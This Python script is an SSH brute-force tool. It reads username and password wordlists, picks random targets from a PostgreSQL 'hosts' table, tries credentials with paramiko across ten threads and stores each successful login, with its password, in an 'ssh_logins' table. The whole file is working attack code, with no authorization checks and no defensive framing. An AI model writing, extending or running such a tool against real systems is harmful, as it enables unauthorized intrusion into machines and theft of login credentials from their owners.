import asyncio
import socket
import nmap
import psycopg2
import paramiko
import traceback
import time
import os 
import json
import random
from dotenv import load_dotenv
import threading

GREEN = '\033[32m'
RED = '\033[31m'
RESET = '\033[0m'
YELLOW = '\033[33m'

load_dotenv()

conn = psycopg2.connect(
    host=os.getenv('DB_HOST'),
    port=os.getenv('DB_PORT'),
    dbname=os.getenv('DB_NAME'),
    user=os.getenv('DB_USER'),
    password=os.getenv('DB_PASSWORD')
)

MAX_RETRIES = 3
THREAD_COUNT = 10

def ssh_login(username_file, password_file):
    with open(username_file, 'r', encoding='utf-8', errors='ignore') as file:
        usernames = file.read().splitlines()

    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        passwords = file.read().splitlines()

    for i in range(1000):
        username = random.choice(usernames)
        password = random.choice(passwords)
        retries = 0
        while retries < MAX_RETRIES:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                # Select a random row from the database
                cur = conn.cursor()
                cur.execute("SELECT hostname, ip_address FROM hosts ORDER BY RANDOM() LIMIT 1")
                row = cur.fetchone()
                if row is None:
                    return

                # Get the hostname and IP address from the selected row
                hostname, ip_address = row

                print(f"{GREEN}Trying {RESET}{username}/{password} {GREEN}as credentials on {RESET}{ip_address}")

                try:
                    client.connect(str(ip_address), port=22, username=username, password=password, timeout=15)
                    print(f"{GREEN}Successful login on {RESET}{ip_address}{GREEN} with credentials: {RESET}{username}/{password}")
                except paramiko.AuthenticationException:
                    # Incorrect credentials, continue to the next one
                    break
                except paramiko.SSHException:
                    print(f"{RED}Failed to connect to {RESET}{ip_address}")
                    break
                except socket.timeout:
                    print(f"{RED}Connection timed out for {RESET}{ip_address}")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError as e:
                    print(f"{RED}Unable to connect to port 22 on {RESET}{ip_address}")
                    print(f"{RED}Error: {RESET}{str(e)}")
                    break
                except (ConnectionResetError, paramiko.ssh_exception.SSHException) as e:
                    print(f"{RED}Connection reset. Retrying...")
                    retries += 1
                    time.sleep(1)  # Wait for 1 second before retrying
                    continue
                finally:
                    client.close()

                cur.execute("INSERT INTO ssh_logins (hostname, ip_address, username, password) VALUES (%s, %s, %s, %s)", (hostname, ip_address, username, password))
                conn.commit()
                break

            except Exception as e:
                print(f"{RED}Error occurred: {RESET}{str(e)}")
                traceback.print_exc()
                break

        if retries >= MAX_RETRIES:
            print(f"{YELLOW}Maximum retries reached. Moving to the next host.")
            break

def run_ssh_login(username_file, password_file):
    ssh_login(username_file, password_file)

def main():
    threads = []

    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=run_ssh_login, args=('usernames.txt', 'passwords.txt'))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == '__main__':
    main()
